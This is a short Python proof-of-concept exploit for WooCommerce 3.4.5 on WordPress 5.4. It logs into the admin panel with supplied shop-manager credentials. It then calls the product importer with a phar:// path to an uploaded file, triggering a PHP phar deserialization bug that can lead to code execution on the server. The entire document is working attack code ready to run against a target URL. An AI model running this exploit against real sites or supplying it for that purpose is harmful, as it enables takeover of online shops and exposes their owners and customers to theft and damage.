# Woocommerce 3.4.5 on Wordpess 5.4 - PoC
import requests
import sys
from bs4 import BeautifulSoup
import base64
import random
import re

def printUsageAndExit():
    print("[#] Usage: python [BASEURL] [SHOP_MANAGER_ID] [SHOP_MANAGER_PW] [UPLOADED_PHAR_PATH]")
    exit()

def login(baseurl, shop_manager_id, shop_manager_pw):
    URL = "{}{}".format(baseurl, "/wp-login.php")
    login_data = {
            "log": shop_manager_id,
            "pwd": shop_manager_pw,
            "wp-submit": "Log In",
            "redirect_to": "{}{}".format(baseurl, "/wp-admin/"),
            "testcookie": "1"
            }
    header = {
	        "Cookie": "wordpress_test_cookie=WP Cookie check",
            }
	
    
    with requests.Session() as session:
        r = session.post(URL, data = login_data, headers = header)
        if(r.text.find("Lost your password?") > -1):
            print("[!] Login Failed!");
            exit()
        else:
            return session

def importProduct(baseurl, manager_session, phar_path):
    import_data = "post_type=product&page=product_importer&step=import&file=phar://{}&delimiter=,".format(phar_path)
    import_url = "{}/wp-admin/edit.php?{}".format(baseurl, import_data)
    manager_session.get(import_url)

if __name__ != '__main__':
    exit()

if(len(sys.argv) < 5):
    printUsageAndExit()

BASEURL = sys.argv[1]
SHOP_MAGNER_ID = sys.argv[2]
SHOP_MAGNER_PW = sys.argv[3]
UPLOADED_PHAR_PATH = sys.argv[4]

manager_session = login(BASEURL, SHOP_MAGNER_ID, SHOP_MAGNER_PW)
print("[#] Phar bug trigger..")
importProduct(BASEURL, manager_session, UPLOADED_PHAR_PATH)
